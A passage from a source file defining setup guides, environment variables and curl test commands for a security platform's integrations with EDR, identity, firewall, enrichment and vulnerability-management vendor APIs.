        title: 'Note your management console URL',
        body:
          'Your console URL is of the form `https://<your-account>.sentinelone.net`. ' +
          'This is the base URL for all API requests.',
      },
      {
        title: 'Configure Kestrel environment variables',
        body:
          'Set `S1_CONSOLE_URL` and `S1_API_TOKEN` in your Kestrel `.env` file. ' +
          'Optionally set `S1_SITE_ID` to filter to a specific site.',
      },
      {
        title: 'Verify connectivity',
        body:
          'Run the test command. A JSON array of threat objects confirms the integration. ' +
          'Kestrel imports threats in CREATED or UNRESOLVED state.',
      },
    ],
    envKeys: [
      { key: 'S1_CONSOLE_URL', label: 'Management Console URL', sensitive: false, hint: 'Your SentinelOne console URL e.g. https://your-account.sentinelone.net' },
      { key: 'S1_API_TOKEN', label: 'API Token', sensitive: true, hint: 'Username menu → My User → Generate API Token' },
      { key: 'S1_SITE_ID', label: 'Site ID (optional)', sensitive: false, hint: 'Settings → Sites — leave blank to pull from all sites' },
    ],
    testCommand:
      'curl -s \\\n' +
      '  -H "Authorization: ApiToken $S1_API_TOKEN" \\\n' +
      '  "$S1_CONSOLE_URL/web/api/v2.1/threats?limit=2" | jq .data[:2]',
    helpTags: ['sentinelone', 's1', 'edr', 'endpoint', 'ai', 'autonomous', 'singularity', 'xdr'],
  },

  // ── 11. VMware Carbon Black ───────────────────────────────────────────────
  {
    id: 'carbonblack',
    name: 'VMware Carbon Black',
    vendor: 'VMware',
    type: 'EDR',
    push: false,
    description: 'Endpoint protection and EDR platform from VMware.',
    logoColor: '#63a01e',
    logoBg: '#eef6e5',
    overview:
      'VMware Carbon Black Cloud provides endpoint protection (NGAV) and EDR through a cloud-native agent. ' +
      'Kestrel integrates with the Carbon Black Cloud REST API to pull alerts and observations, ' +
      'enriching them with process lineage, device context, and MITRE ATT&CK technique information.',
    prerequisites: [
      'Carbon Black Cloud subscription (Endpoint Standard or higher)',
      'Custom API access level with permissions: `org.alerts: READ` and `device: READ`',
      'API Key and API Key ID (Connector ID) from the Carbon Black Cloud console',
      'Organisation key from the Carbon Black Cloud console',
      'Carbon Black Cloud API base URL for your region',
    ],
    setupSteps: [
      {
        title: 'Create an API key in Carbon Black Cloud',
        body:
          'Log into the console → Settings → API Access → API Keys → Add API Key. ' +
          'Set the access level type to Custom and enable `org.alerts: READ` and `device: READ`. ' +
          'Copy both the API Key and API ID (these are used together for authentication).',
      },
      {
        title: 'Get your Organisation Key',
        body:
          'Navigate to Settings → API Access → copy the Org Key shown at the top of the page. ' +
          'This is required for all API calls.',
      },
      {
        title: 'Identify your API base URL',
        body:
          'The base URL depends on your region:\n' +
          'US East: `https://defense.conferdeploy.net`\n' +
          'US West: `https://defense-prod05.conferdeploy.net`\n' +
          'EU: `https://defense-eu.conferdeploy.net`',
      },
      {
        title: 'Set Kestrel environment variables',
        body:
          'Add `CBC_ORG_KEY`, `CBC_API_KEY`, `CBC_API_ID`, and `CBC_BASE_URL` to your Kestrel `.env` file.',
      },
      {
        title: 'Test and activate',
        body:
          'Run the test command to list recent alerts. The Authorization header combines API ID and API Key as `<ID>/<Key>`.',
      },
    ],
    envKeys: [
      { key: 'CBC_ORG_KEY', label: 'Organisation Key', sensitive: false, hint: 'Settings → API Access → Org Key' },
      { key: 'CBC_API_KEY', label: 'API Key', sensitive: true, hint: 'Settings → API Access → API Keys → API Key value' },
      { key: 'CBC_API_ID', label: 'API ID (Connector ID)', sensitive: false, hint: 'Settings → API Access → API Keys → API ID' },
      { key: 'CBC_BASE_URL', label: 'Carbon Black Cloud Base URL', sensitive: false, hint: 'Region-specific URL e.g. https://defense.conferdeploy.net' },
    ],
    testCommand:
      'curl -s \\\n' +
      '  -H "X-Auth-Token: $CBC_API_KEY/$CBC_API_ID" \\\n' +
      '  "$CBC_BASE_URL/api/alerts/v7/orgs/$CBC_ORG_KEY/alerts/_search" \\\n' +
      '  -H "Content-Type: application/json" \\\n' +
      '  -d \'{"rows":2,"criteria":{"minimum_severity":3}}\' | jq .results[:2]',
    helpTags: ['carbon black', 'vmware', 'cbc', 'edr', 'endpoint', 'ngav', 'cloud', 'alerts'],
  },

  // ── 12. Palo Alto Cortex XDR ─────────────────────────────────────────────
  {
    id: 'cortex-xdr',
    name: 'Palo Alto Cortex XDR',
    vendor: 'Palo Alto Networks',
    type: 'EDR',
    push: false,
    description: 'Extended detection and response platform from Palo Alto Networks.',
    logoColor: '#00c1de',
    logoBg: '#e5fafd',
    overview:
      'Palo Alto Cortex XDR combines endpoint, network, and cloud telemetry for extended detection and response. ' +
      'Kestrel connects via the Cortex XDR API to pull incidents and alerts, ' +
      'extracting full alert chains, causality processes, and MITRE ATT&CK tags for comprehensive threat visibility.',
    prerequisites: [
      'Cortex XDR Pro or Elite subscription',
      'Cortex XDR tenant URL and customer name',
      'API key and key ID generated from the Cortex XDR settings',
      'Advanced API key type for write-access operations (Standard for read-only)',
    ],
    setupSteps: [
      {
        title: 'Generate a Cortex XDR API key',
        body:
          'In the Cortex XDR console navigate to Settings → Configurations → Integrations → API Keys → + New Key. ' +
          'Set the type to Standard (read) or Advanced (read+write). Copy the API Key and note the Key ID.',
      },
      {
        title: 'Note your Tenant FQDN',
        body:
          'Your tenant URL is of the form `https://<customer-name>.xdr.us.paloaltonetworks.com`. ' +
          'The API base URL appends `/public_api/v1/` to this.',
      },
      {
        title: 'Set Kestrel environment variables',
        body:
          'Add `CORTEX_API_KEY`, `CORTEX_API_KEY_ID`, and `CORTEX_BASE_URL` to your Kestrel `.env`.',
      },
      {
        title: 'Verify and test',
        body:
          'Run the test command. The auth header uses a nonce + timestamp + SHA256 digest pattern — Kestrel handles this automatically.',
      },
    ],
    envKeys: [
      { key: 'CORTEX_API_KEY', label: 'Cortex XDR API Key', sensitive: true, hint: 'Settings → API Keys → key value' },
      { key: 'CORTEX_API_KEY_ID', label: 'Cortex XDR API Key ID', sensitive: false, hint: 'Settings → API Keys → Key ID (numeric)' },
      { key: 'CORTEX_BASE_URL', label: 'Tenant Base URL', sensitive: false, hint: 'Your Cortex XDR tenant URL e.g. https://customer.xdr.us.paloaltonetworks.com' },
    ],
    testCommand:
      '# Kestrel auto-generates the auth nonce — verify credentials via the Kestrel config test endpoint:\n' +
      'curl -s http://localhost:8000/api/v1/sources/cortex-xdr/test | jq .',
    helpTags: ['cortex', 'xdr', 'palo alto', 'edr', 'extended detection', 'incidents', 'mitre', 'cloud'],
  },

  // ── 13. Azure Active Directory ────────────────────────────────────────────
  {
    id: 'azure-ad',
    name: 'Azure Active Directory',
    vendor: 'Microsoft',
    type: 'Identity',
    push: false,
    description: 'Microsoft identity platform — sign-in risk and audit logs.',
    logoColor: '#0078d4',
    logoBg: '#e6f2fb',
    overview:
      "Azure Active Directory (Azure AD / Entra ID) is Microsoft's cloud identity platform, providing authentication " +
      'and authorisation for millions of applications. ' +
      'Kestrel integrates via the Microsoft Graph API to pull risky sign-in events, Identity Protection risk detections, ' +
      'and audit log entries — alerting on suspicious authentications, MFA bypass attempts, and anomalous user behaviour.',
    prerequisites: [
      'Azure AD tenant with Azure AD P2 licence (required for Identity Protection / risky sign-ins)',
      'App registration with the following Microsoft Graph API application permissions: `IdentityRiskEvent.Read.All`, `AuditLog.Read.All`, `SignIn.Read.All`',
      'Admin consent granted to the app permissions',
      'Tenant ID, client ID, and client secret for the app registration',
    ],
    setupSteps: [
      {
        title: 'Create an app registration',
        body:
          'In Azure AD → App registrations → New registration. Name it `kestrel-aad`. ' +
          'Note the tenant ID and application (client) ID from the Overview blade.',
      },
      {
        title: 'Add Microsoft Graph permissions',
        body:
          'Under API permissions → Add a permission → Microsoft Graph → Application permissions. ' +
          'Add: `IdentityRiskEvent.Read.All`, `AuditLog.Read.All`, `SignIn.Read.All`. ' +
          'Click "Grant admin consent for <tenant>".',
      },
      {
        title: 'Create a client secret',
        body:
          'Under Certificates & secrets → New client secret. Set an expiry and copy the secret Value.',
      },
      {
        title: 'Set Kestrel environment variables',
        body:
          'Add `AZURE_TENANT_ID`, `AZURE_CLIENT_ID`, `AZURE_CLIENT_SECRET` to your Kestrel `.env`.',
      },
      {
        title: 'Test the Graph API',
        body:
          'Run the test command to list recent risky sign-ins. A JSON response confirms access.',
      },
    ],
    envKeys: [
      { key: 'AZURE_TENANT_ID', label: 'Azure Tenant ID', sensitive: false, hint: 'Azure AD → Overview → Tenant ID' },
      { key: 'AZURE_CLIENT_ID', label: 'Application (Client) ID', sensitive: false, hint: 'App registration → Overview → Application (client) ID' },
      { key: 'AZURE_CLIENT_SECRET', label: 'Client Secret', sensitive: true, hint: 'App registration → Certificates & secrets → Value' },
    ],
    testCommand:
      'TOKEN=$(curl -s -X POST \\\n' +
      '  "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \\\n' +
      '  -d "client_id=$AZURE_CLIENT_ID&client_secret=$AZURE_CLIENT_SECRET&grant_type=client_credentials&scope=https://graph.microsoft.com/.default" \\\n' +
      '  | jq -r .access_token)\n\n' +
      'curl -s -H "Authorization: Bearer $TOKEN" \\\n' +
      '  "https://graph.microsoft.com/v1.0/identityProtection/riskDetections?\\$top=2" | jq .value',
    helpTags: ['azure ad', 'aad', 'entra id', 'identity', 'sign-in risk', 'mfa', 'graph api', 'microsoft'],
  },

  // ── 14. Okta ─────────────────────────────────────────────────────────────
  {
    id: 'okta',
    name: 'Okta',
    vendor: 'Okta',
    type: 'Identity',
    push: false,
    description: 'Cloud identity provider — authentication events and threat insights.',
    logoColor: '#007dc1',
    logoBg: '#e5f3fb',
    overview:
      'Okta is a leading cloud identity and access management platform used by thousands of organisations. ' +
      'Kestrel pulls Okta System Log events via the `/api/v1/logs` endpoint, ' +
      'detecting authentication anomalies, MFA fatigue attacks, impossible travel, and account compromise indicators ' +
      'from Okta ThreatInsight data.',
    prerequisites: [
      'Okta organisation (any plan — API access is available on all plans)',
      'Okta API token with Read-Only Administrator privileges or a custom role with `okta.logs.read` permission',
      'Your Okta organisation domain (e.g. company.okta.com or company.okta-emea.com)',
    ],
    setupSteps: [
      {
        title: 'Create an Okta API token',
        body:
          'Log in to the Okta Admin Console → Security → API → Tokens → Create Token. ' +
          'Name it `kestrel` and copy the token value — it is shown only once. ' +
          'The token inherits the permissions of the user who created it.',
      },
      {
        title: 'Ensure the user has Read-Only Admin role',
        body:
          'The API token user should have at minimum the `Read-Only Administrator` role in Okta. ' +
          'This grants access to system logs, users, and groups without modification permissions.',
      },
      {
        title: 'Note your Okta domain',
        body:
          'Your Okta domain is visible in the browser URL when logged into the admin console, ' +
          'e.g. `https://company.okta.com`. This forms the base URL for all API calls.',
      },
      {
        title: 'Set Kestrel environment variables',
        body:
          'Add `OKTA_DOMAIN` (e.g. `company.okta.com`) and `OKTA_API_TOKEN` to your Kestrel `.env`.',
      },
      {
        title: 'Test the System Log API',
        body:
          'Run the test command to confirm log access. A JSON array of system log entries confirms success.',
      },
    ],
    envKeys: [
      { key: 'OKTA_DOMAIN', label: 'Okta Domain', sensitive: false, hint: 'Your Okta org domain e.g. company.okta.com (no https://)' },
      { key: 'OKTA_API_TOKEN', label: 'Okta API Token', sensitive: true, hint: 'Security → API → Tokens → token value' },
    ],
    testCommand:
      'curl -s \\\n' +
      '  -H "Authorization: SSWS $OKTA_API_TOKEN" \\\n' +
      '  "https://$OKTA_DOMAIN/api/v1/logs?limit=2" | jq .[:2]',
    helpTags: ['okta', 'identity', 'sso', 'mfa', 'authentication', 'system log', 'iam', 'saml'],
  },

  // ── 15. Palo Alto Firewall ────────────────────────────────────────────────
  {
    id: 'palo-alto',
    name: 'Palo Alto Firewall',
    vendor: 'Palo Alto Networks',
    type: 'Network',
    push: false,
    description: 'Next-generation firewall threat logs and traffic analytics.',
    logoColor: '#00c1de',
    logoBg: '#e5fafd',
    overview:
      'Palo Alto Networks Next-Generation Firewalls provide deep packet inspection, application awareness, and threat prevention. ' +
      'Kestrel connects to Panorama or individual NGFW devices via the XML API to pull threat logs, ' +
      'WildFire verdicts, and URL filtering events, converting them to Kestrel alerts with network context.',
    prerequisites: [
      'PAN-OS 9.0 or later (NGFW or Panorama)',
      'Admin user with the `Superuser (read-only)` role or a custom role with XML API access',
      'API key generated from the PAN-OS XML API',
      'HTTPS access to the NGFW or Panorama management interface from the Kestrel host',
    ],
    setupSteps: [
      {
        title: 'Generate a PAN-OS API key',
        body:
          'From the management UI: Device → Administrators → create or select a user. ' +
          'Generate the API key via:\n' +
          '`curl -k "https://<fw-ip>/api/?type=keygen&user=<user>&password=<pass>"`\n' +
          'Copy the key from the XML response.',
      },
      {
        title: 'Set Kestrel environment variables',
        body:
          'Add `PANOS_HOST` (firewall or Panorama IP/hostname), `PANOS_API_KEY`, and optionally ' +
          '`PANOS_VSYS` (default `vsys1`) to your Kestrel `.env`.',
      },
      {
        title: 'Configure log forwarding (optional)',
        body:
          'For high-volume environments consider also configuring a syslog or CEF forwarder from the NGFW ' +
          'to the Kestrel ingest endpoint to avoid polling overhead.',
      },
      {
        title: 'Test the XML API',
        body:
          'Run the test command to query recent threat logs. A valid XML/JSON response confirms the key is working.',
      },
    ],
    envKeys: [
      { key: 'PANOS_HOST', label: 'Firewall / Panorama Host', sensitive: false, hint: 'IP or hostname of the NGFW management interface or Panorama' },
      { key: 'PANOS_API_KEY', label: 'PAN-OS API Key', sensitive: true, hint: 'Generated via /api/?type=keygen — see setup step 1' },
      { key: 'PANOS_VSYS', label: 'Virtual System (vsys)', sensitive: false, hint: 'Default: vsys1 — change for multi-vsys deployments' },
    ],
    testCommand:
      'curl -k -s \\\n' +
      '  "https://$PANOS_HOST/api/?type=log&log-type=threat&nlogs=2&key=$PANOS_API_KEY" | python3 -c "import sys,xmltodict,json; print(json.dumps(xmltodict.parse(sys.stdin.read()),indent=2))"',
    helpTags: ['palo alto', 'ngfw', 'firewall', 'panorama', 'threat log', 'wildfire', 'network', 'pan-os'],
  },

  // ── 16. Fortinet FortiGate ────────────────────────────────────────────────
  {
    id: 'fortinet',
    name: 'Fortinet FortiGate',
    vendor: 'Fortinet',
    type: 'Network',
    push: false,
    description: 'FortiGate NGFW event and threat logs via FortiManager or REST API.',
    logoColor: '#ee3124',
    logoBg: '#fdecea',
    overview:
      'Fortinet FortiGate is a widely deployed next-generation firewall offering unified threat management. ' +
      'Kestrel integrates via the FortiGate REST API to pull IPS, antivirus, and web filter event logs, ' +
      'or via FortiManager/FortiAnalyzer for multi-device environments, converting threat events into Kestrel alerts.',
    prerequisites: [
      'FortiGate running FortiOS 6.4 or later',
      'REST API admin account or API user on the FortiGate',
      'FortiGate management HTTPS access from the Kestrel host',
      'FortiOS REST API enabled (System → Feature Visibility → REST API access)',
    ],
    setupSteps: [
      {
        title: 'Create a FortiGate REST API admin',
        body:
          'In FortiGate go to System → Administrators → Create New → REST API Admin. ' +
          'Restrict to a trusted host IP (your Kestrel host IP). ' +
          'Set the admin profile to a read-only profile. Copy the generated API key.',
      },
      {
        title: 'Enable REST API access',
        body:
          'Go to System → Feature Visibility and ensure REST API access is enabled. ' +
          'If accessing from outside the management VLAN, configure the trusted host whitelist appropriately.',
      },
      {
        title: 'Set Kestrel environment variables',
        body:
          'Add `FORTIGATE_HOST`, `FORTIGATE_API_KEY`, and optionally `FORTIGATE_VDOM` (default `root`) ' +
          'to your Kestrel `.env` file.',
      },
      {
        title: 'Test the REST API',
        body:
          'Run the test command. A successful response lists recent event log entries.',
      },
    ],
    envKeys: [
      { key: 'FORTIGATE_HOST', label: 'FortiGate Host', sensitive: false, hint: 'IP or hostname of the FortiGate management interface' },
      { key: 'FORTIGATE_API_KEY', label: 'FortiGate API Key', sensitive: true, hint: 'System → Administrators → REST API Admin → API key value' },
      { key: 'FORTIGATE_VDOM', label: 'VDOM', sensitive: false, hint: 'Default: root — change for multi-VDOM deployments' },
    ],
    testCommand:
      'curl -k -s \\\n' +
      '  -H "Authorization: Bearer $FORTIGATE_API_KEY" \\\n' +
      '  "https://$FORTIGATE_HOST/api/v2/log/forticloud/threat/select?vdom=$FORTIGATE_VDOM&rows=2" | jq .results[:2]',
    helpTags: ['fortinet', 'fortigate', 'fortimanager', 'ngfw', 'ips', 'firewall', 'network', 'utm'],
  },

  // ── 17. Microsoft 365 Defender ────────────────────────────────────────────
  {
    id: 'microsoft-365',
    name: 'Microsoft 365 Defender',
    vendor: 'Microsoft',
    type: 'Email',
    push: false,
    description: 'Unified XDR for M365 — email, identity, endpoint, and cloud app threats.',
    logoColor: '#0078d4',
    logoBg: '#e6f2fb',
    overview:
      'Microsoft 365 Defender is a unified extended detection and response (XDR) solution covering email, ' +
      'identity, endpoints, and cloud applications. ' +
      'Kestrel integrates via the Microsoft 365 Defender API (security.microsoft.com) to pull incidents and alerts, ' +
      'including Defender for Office 365 phishing detections, safe links detonations, and BEC indicators.',
    prerequisites: [
      'Microsoft 365 E5 or Microsoft Defender for Office 365 Plan 2 licence',
      'App registration with Microsoft Graph application permissions: `SecurityAlert.Read.All`, `SecurityIncident.Read.All`',
      'Admin consent granted for the application permissions',
      'Tenant ID, client ID, and client secret',
    ],
    setupSteps: [
      {
        title: 'Create an app registration for M365 Defender',
        body:
          'In Azure AD → App registrations → New registration. Name it `kestrel-m365-defender`. ' +
          'Note the tenant and client IDs.',
      },
      {
        title: 'Add Microsoft Graph permissions',
        body:
          'API permissions → Add a permission → Microsoft Graph → Application permissions. ' +
          'Add: `SecurityAlert.Read.All` and `SecurityIncident.Read.All`. ' +
          'Grant admin consent.',
      },
      {
        title: 'Create a client secret',
        body:
          'Certificates & secrets → New client secret. Copy the Value.',
      },
      {
        title: 'Set Kestrel environment variables',
        body:
          'Add `M365_TENANT_ID`, `M365_CLIENT_ID`, `M365_CLIENT_SECRET` to your Kestrel `.env`.',
      },
      {
        title: 'Test the Security API',
        body:
          'Run the test command to list recent M365 Defender incidents.',
      },
    ],
    envKeys: [
      { key: 'M365_TENANT_ID', label: 'Tenant ID', sensitive: false, hint: 'Azure AD → Overview → Tenant ID' },
      { key: 'M365_CLIENT_ID', label: 'Client ID', sensitive: false, hint: 'App registration → Application (client) ID' },
      { key: 'M365_CLIENT_SECRET', label: 'Client Secret', sensitive: true, hint: 'App registration → Certificates & secrets → Value' },
    ],
    testCommand:
      'TOKEN=$(curl -s -X POST \\\n' +
      '  "https://login.microsoftonline.com/$M365_TENANT_ID/oauth2/v2.0/token" \\\n' +
      '  -d "client_id=$M365_CLIENT_ID&client_secret=$M365_CLIENT_SECRET&grant_type=client_credentials&scope=https://graph.microsoft.com/.default" \\\n' +
      '  | jq -r .access_token)\n\n' +
      'curl -s -H "Authorization: Bearer $TOKEN" \\\n' +
      '  "https://graph.microsoft.com/v1.0/security/incidents?\\$top=2" | jq .value',
    helpTags: ['microsoft 365', 'm365', 'defender', 'email', 'phishing', 'bec', 'office 365', 'xdr'],
  },

  // ── 18. Google Workspace ──────────────────────────────────────────────────
  {
    id: 'google-workspace',
    name: 'Google Workspace',
    vendor: 'Google',
    type: 'Email',
    push: false,
    description: 'Google Workspace Admin SDK Reports API — login, drive, and admin events.',
    logoColor: '#4285f4',
    logoBg: '#eaf0fe',
    overview:
      'Google Workspace (formerly G Suite) provides cloud productivity and collaboration tools with rich audit logging ' +
      'through the Admin SDK Reports API. ' +
      'Kestrel pulls Login audit, Admin audit, and Gmail security events to detect account compromise, ' +
      'suspicious sign-ins, OAuth token abuse, and phishing-related activities.',
    prerequisites: [
      'Google Workspace Business or Enterprise subscription',
      'Google Cloud project with the Admin SDK API enabled',
      'Service account with domain-wide delegation configured',
      'Service account JSON key file',
      'Super admin account email address for impersonation (required by Admin SDK)',
    ],
    setupSteps: [
      {
        title: 'Enable the Admin SDK Reports API',
        body:
          'In Google Cloud Console → APIs & Services → Enable APIs → search for "Admin SDK API" → Enable.',
      },
      {
        title: 'Create a service account and JSON key',
        body:
          'IAM & Admin → Service Accounts → Create. Name it `kestrel-workspace`. ' +
          'Under Keys → Add Key → Create new key → JSON. Download the key file.',
      },
      {
        title: 'Configure domain-wide delegation',
        body:
          'In the Google Workspace Admin Console (admin.google.com) → Security → API controls → ' +
          'Domain-wide Delegation → Add new. ' +
          'Enter the service account client ID and add scope:\n' +
          '`https://www.googleapis.com/auth/admin.reports.audit.readonly`',
      },
      {
        title: 'Set Kestrel environment variables',
        body:
          'Add `GWORKSPACE_SERVICE_ACCOUNT_KEY` (JSON key file path) and `GWORKSPACE_ADMIN_EMAIL` ' +
          '(a super admin account for impersonation) to your Kestrel `.env`.',
      },
      {
        title: 'Test the Reports API',
        body:
          'Run the test command using the service account credentials to list recent login events.',
      },
    ],
    envKeys: [
      { key: 'GWORKSPACE_SERVICE_ACCOUNT_KEY', label: 'Service Account JSON Key Path', sensitive: true, hint: 'Full path to the downloaded service account JSON key file' },
      { key: 'GWORKSPACE_ADMIN_EMAIL', label: 'Admin Email for Impersonation', sensitive: false, hint: 'A super admin email — the service account impersonates this user to call the Reports API' },
    ],
    testCommand:
      '# Use Kestrel\'s built-in test endpoint after configuring env vars:\n' +
      'curl -s http://localhost:8000/api/v1/sources/google-workspace/test | jq .',
    helpTags: ['google workspace', 'gsuite', 'gmail', 'admin sdk', 'email', 'login audit', 'drive', 'oauth'],
  },

  // ── 19. VirusTotal ────────────────────────────────────────────────────────
  {
    id: 'virustotal',
    name: 'VirusTotal',
    vendor: 'Google (VirusTotal)',
    type: 'Enrichment',
    push: false,
    description: 'IOC enrichment — file hash, URL, IP, and domain reputation.',
    logoColor: '#394eff',
    logoBg: '#ebebff',
    overview:
      'VirusTotal aggregates threat intelligence from over 70 antivirus engines and URL scanners. ' +
      'Kestrel uses the VirusTotal API v3 to automatically enrich alert observables — ' +
      'querying file hashes, IP addresses, URLs, and domains — and surfaces the results in the Enrichment tab ' +
      'of every alert detail view.',
    prerequisites: [
      'VirusTotal account (free tier provides 4 requests/minute; VirusTotal Intelligence recommended for production)',
      'VirusTotal API key',
    ],
    setupSteps: [
      {
        title: 'Get your VirusTotal API key',
        body:
          'Create or log in to a VirusTotal account at virustotal.com. ' +
          'Navigate to your profile (top right) → API Key. Copy the key.',
      },
      {
        title: 'Set Kestrel environment variable',
        body:
          'Add `VIRUSTOTAL_API_KEY` to your Kestrel `.env` file. ' +
          'Kestrel automatically throttles requests to stay within your API rate limit.',
      },
      {
        title: 'Understand rate limits',
        body:
          'Free tier: 4 lookups/minute, 500/day. ' +
          'Premium (VirusTotal Intelligence): up to 3000/minute. ' +
          'Kestrel queues enrichment requests and retries with backoff on rate-limit responses.',
      },
      {
        title: 'Verify the API key',
        body:
          'Run the test command. A valid key returns a JSON object with quota and rate limit information.',
      },
    ],
    envKeys: [
      { key: 'VIRUSTOTAL_API_KEY', label: 'VirusTotal API Key', sensitive: true, hint: 'virustotal.com → profile menu → API Key' },
    ],
    testCommand:
      'curl -s \\\n' +
      '  -H "x-apikey: $VIRUSTOTAL_API_KEY" \\\n' +
      '  "https://www.virustotal.com/api/v3/ip_addresses/8.8.8.8" | jq .data.attributes.last_analysis_stats',
    helpTags: ['virustotal', 'vt', 'enrichment', 'ioc', 'hash', 'url', 'reputation', 'threat intelligence'],
  },

  // ── 20. AbuseIPDB ─────────────────────────────────────────────────────────
  {
    id: 'abuseipdb',
    name: 'AbuseIPDB',
    vendor: 'AbuseIPDB',
    type: 'Enrichment',
    push: false,
    description: 'IP address abuse confidence scoring and threat intelligence.',
    logoColor: '#cc2929',
    logoBg: '#fceaea',
    overview:
      'AbuseIPDB is a crowdsourced IP abuse reporting database that provides confidence scores for IP addresses. ' +
      'Kestrel automatically queries AbuseIPDB for source and destination IPs in ingested alerts, ' +
      'displaying abuse confidence percentages and report counts in the alert Enrichment tab to help analysts ' +
      'quickly identify known malicious infrastructure.',
    prerequisites: [
      'AbuseIPDB account (free tier: 1000 checks/day)',
      'AbuseIPDB API key',
    ],
    setupSteps: [
      {
        title: 'Get your AbuseIPDB API key',
        body:
          'Register or log in at abuseipdb.com → User Settings → API. ' +
          'Click "Create Key", name it `kestrel`, and copy the generated API key.',
      },
      {
        title: 'Set Kestrel environment variable',
        body:
          'Add `ABUSEIPDB_API_KEY` to your Kestrel `.env` file.',
      },
      {
        title: 'Understand rate limits',
        body:
          'Free: 1000 checks/day. Basic: 3000/day. Premium: up to 60k/day. ' +
          'Kestrel caches results per IP for 1 hour to minimise API usage.',
      },
      {
        title: 'Verify the API key',
        body:
          'Run the test command to check a known malicious IP. ' +
          'A successful response includes `abuseConfidenceScore` and `totalReports`.',
      },
    ],
    envKeys: [
      { key: 'ABUSEIPDB_API_KEY', label: 'AbuseIPDB API Key', sensitive: true, hint: 'abuseipdb.com → User Settings → API → Create Key' },
    ],
    testCommand:
      'curl -s \\\n' +
      '  -H "Key: $ABUSEIPDB_API_KEY" \\\n' +
      '  -H "Accept: application/json" \\\n' +
      '  "https://api.abuseipdb.com/api/v2/check?ipAddress=1.1.1.1&maxAgeInDays=90" | jq .data',
    helpTags: ['abuseipdb', 'ip reputation', 'enrichment', 'ioc', 'blacklist', 'threat intelligence', 'abuse'],
  },

  // ── 21. Shodan ────────────────────────────────────────────────────────────
  {
    id: 'shodan',
    name: 'Shodan',
    vendor: 'Shodan',
    type: 'Enrichment',
    push: false,
    description: 'Internet-wide asset and exposure data for IP enrichment.',
    logoColor: '#c33b3b',
    logoBg: '#fbeaea',
    overview:
      'Shodan continuously scans the public internet, indexing banners, open ports, and exposed services for every ' +
      'reachable IP address. ' +
      'Kestrel uses the Shodan Host API to enrich alert source IPs with open port data, identified services, ' +
      'geographic information, and known vulnerability exposure — helping analysts assess attacker infrastructure quickly.',
    prerequisites: [
      'Shodan account (free tier provides basic host lookups; Shodan Member or higher recommended)',
      'Shodan API key',
    ],
    setupSteps: [
      {
        title: 'Get your Shodan API key',
        body:
          'Log in to account.shodan.io → click your account name → API Key. Copy the key.',
      },
      {
        title: 'Set Kestrel environment variable',
        body:
          'Add `SHODAN_API_KEY` to your Kestrel `.env` file.',
      },
      {
        title: 'Understand API limits',
        body:
          'Free tier: 100 queries/month (limited). Shodan Member ($69 one-time): 1 query credit/day. ' +
          'Enterprise: unlimited. Kestrel caches host lookups for 24 hours to conserve query credits.',
      },
      {
        title: 'Test the Host API',
        body:
          'Run the test command to look up a known IP. A successful response shows open ports and service data.',
      },
    ],
    envKeys: [
      { key: 'SHODAN_API_KEY', label: 'Shodan API Key', sensitive: true, hint: 'account.shodan.io → API Key' },
    ],
    testCommand:
      'curl -s "https://api.shodan.io/shodan/host/8.8.8.8?key=$SHODAN_API_KEY" | jq \'{ports,isp,country_name,vulns}\'',
    helpTags: ['shodan', 'internet scanning', 'enrichment', 'open ports', 'exposure', 'ioc', 'asset discovery'],
  },

  // ── 22. Tenable.io ────────────────────────────────────────────────────────
  {
    id: 'tenable',
    name: 'Tenable.io',
    vendor: 'Tenable',
    type: 'Vulnerability',
    push: false,
    description: 'Cloud-based vulnerability management and asset inventory.',
    logoColor: '#00bfb3',
    logoBg: '#e5faf9',
    overview:
      'Tenable.io is a cloud-based vulnerability management platform that continuously scans and assesses ' +
      'asset vulnerabilities using the Nessus scanning engine. ' +
      'Kestrel pulls Tenable.io vulnerability findings via the Vulnerabilities API, ' +
      'correlating CVEs with alert source hosts to surface vulnerability context for assets involved in security incidents.',
    prerequisites: [
      'Tenable.io account with the Tenable.io Vulnerability Management product',
      'API access key and secret key from the Tenable.io settings',
      'User account with at minimum "Basic" access level (or standard role)',
    ],
    setupSteps: [
      {
        title: 'Generate Tenable.io API keys',
        body:
          'Log into cloud.tenable.com → click your username → My Account → API Keys → Generate. ' +
          'Copy both the Access Key and Secret Key — they are shown only once.',
      },
      {
        title: 'Set Kestrel environment variables',
        body:
          'Add `TENABLE_ACCESS_KEY` and `TENABLE_SECRET_KEY` to your Kestrel `.env` file.',
      },
      {
        title: 'Configure scan schedule',
        body:
          'Kestrel imports the latest scan findings from the most recent completed scans. ' +
          'Ensure your Tenable.io scans are scheduled to run at least weekly for current vulnerability data.',
      },
      {
        title: 'Test the API',
        body:
          'Run the test command. A JSON list of recent scans confirms API access is working.',
      },
    ],
    envKeys: [
      { key: 'TENABLE_ACCESS_KEY', label: 'Tenable Access Key', sensitive: true, hint: 'cloud.tenable.com → username → My Account → API Keys → Access Key' },
      { key: 'TENABLE_SECRET_KEY', label: 'Tenable Secret Key', sensitive: true, hint: 'cloud.tenable.com → username → My Account → API Keys → Secret Key' },
    ],
    testCommand:
      'curl -s \\\n' +
      '  -H "X-ApiKeys: accessKey=$TENABLE_ACCESS_KEY; secretKey=$TENABLE_SECRET_KEY" \\\n' +
      '  "https://cloud.tenable.com/scans?limit=2" | jq .scans[:2]',
    helpTags: ['tenable', 'nessus', 'vulnerability', 'cve', 'scanning', 'asset', 'risk', 'compliance'],
  },

  // ── 23. Qualys VMDR ───────────────────────────────────────────────────────
  {
    id: 'qualys',
    name: 'Qualys VMDR',
    vendor: 'Qualys',
    type: 'Vulnerability',
    push: false,
    description: 'Vulnerability management, detection, and response from Qualys.',
    logoColor: '#ed1c24',
    logoBg: '#fde9ea',
    overview:
      'Qualys VMDR (Vulnerability Management, Detection and Response) provides continuous vulnerability assessment ' +
      'across cloud, on-premises, and remote assets. ' +
      'Kestrel integrates with the Qualys API v2 to pull vulnerability detections and asset risk scores, ' +
      'correlating identified vulnerabilities with hosts seen in security alerts for contextualised risk assessment.',
    prerequisites: [
      'Qualys subscription with VMDR module enabled',
      'Qualys platform URL (e.g. qualysapi.qualys.com or region-specific)',
      'Qualys username and password (basic authentication) or Qualys EULA accepted',
      'API access enabled for the Qualys user account',
    ],
    setupSteps: [
      {
        title: 'Enable API access for your user',
        body:
          'In the Qualys portal navigate to Users → Edit user → Roles → ensure "API Access" is checked. ' +
          'The Qualys API uses HTTP basic authentication with your Qualys credentials.',
      },
      {
        title: 'Identify your Qualys API URL',
        body:
